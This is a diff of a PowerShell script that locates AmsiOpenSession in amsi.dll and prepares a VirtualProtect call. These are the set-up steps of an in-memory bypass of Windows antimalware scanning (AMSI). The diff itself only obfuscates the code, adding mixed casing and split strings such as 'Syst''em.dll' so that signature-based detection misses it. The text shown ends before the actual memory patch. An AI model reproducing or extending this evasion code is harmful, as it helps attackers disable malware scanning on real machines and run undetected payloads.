@@ -1,11 +1,11 @@
 function lookAlike{
 Param($moduleName, $functionName)
 
-$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
-Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
+$assem = ([AppDomain]::CurreNtDomain.GetAssEmblies() |
+Where-Object {$_.GlobAlAssemblyCache -And $_.LOcation.Split('\\')[-1].Equals('Syst''em.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
-$assem.GetMethods() | ForEach-Object{If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}
-return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+$ass''em.GetMethods() | FoREach-Object{If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}
+return $tmp[0].InvOke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
 }
 
 Start-Sleep 5
@@ -16,11 +16,11 @@ Param(
 [Parameter(Position = 1)] [Type] $delType = [Void]
 )
 
-$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
-[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType',
-'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+$type = [AppDom''ain]::CurrentDo''main.DefinEDynamicAssEmbly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+[Sys''tem.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType',
+'Class, Public, Sealed, AnsiClass, AutoClass', [System.MuLticastDelegate])
 
-$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+$type.DefineConstrUctor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
 $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
 
 return $type.CreateType()
@@ -28,7 +28,7 @@ return $type.CreateType()
 
 Start-Sleep 5
 
-[IntPtr]$amsiAddr = lookAlike amsi.dll AmsiOpenSession
+[IntPtr]$amsIAddr = lookAlike amsi.dll AmsiOpenSession
 $oldProtect = 0
 $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookAlike kernel32.dll VirtualProtect),
 (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
